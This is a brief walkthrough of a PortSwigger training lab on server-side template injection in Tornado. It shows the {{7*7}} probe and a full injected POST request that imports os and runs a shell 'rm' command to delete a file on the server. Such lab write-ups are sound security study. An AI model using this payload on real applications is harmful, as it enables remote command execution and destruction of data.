https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic-code-context

This lab is vulnerable to server-side template injection due to the way it unsafely uses a Tornado template. To solve the lab, review the Tornado documentation to discover how to execute arbitrary code, then delete the morale.txt file from Carlos's home directory.

You can log in to your own account using the following credentials: wiener:peter


1) login as wiener:peter and see that in the account page there is a functionality that allow us to say a preferenceover the name that must be visualized on our comments on a post

2) we know that the site uses tornado and we can see that when we write a comment on a post the name displayed is the one we choose in the profile settings

3) try to inject a value on the request to POST /my-account/change-blog-post-author-display  for example
    blog-post-author-display=user.nickname}}{{7*7}}&csrf=3ZLsBHTnt5fOKuAqcn2jmmRMjVw280ED

    we can see now that in our comments we see our nickname and 49 so we can inject a command

4) in tornado we can use python so:
    {% import os %}
    {{os.system('rm /home/carlos/morale.txt')}} 
    
    allows us to remove the file on the server

    so let's do on POST /my-account/change-blog-post-author-display:
    
     blog-post-author-display=user.nickname}}{% import os %}{{os.system('rm /home/carlos/morale.txt')}}&csrf=3ZLsBHTnt5fOKuAqcn2jmmRMjVw280ED



5) perfect


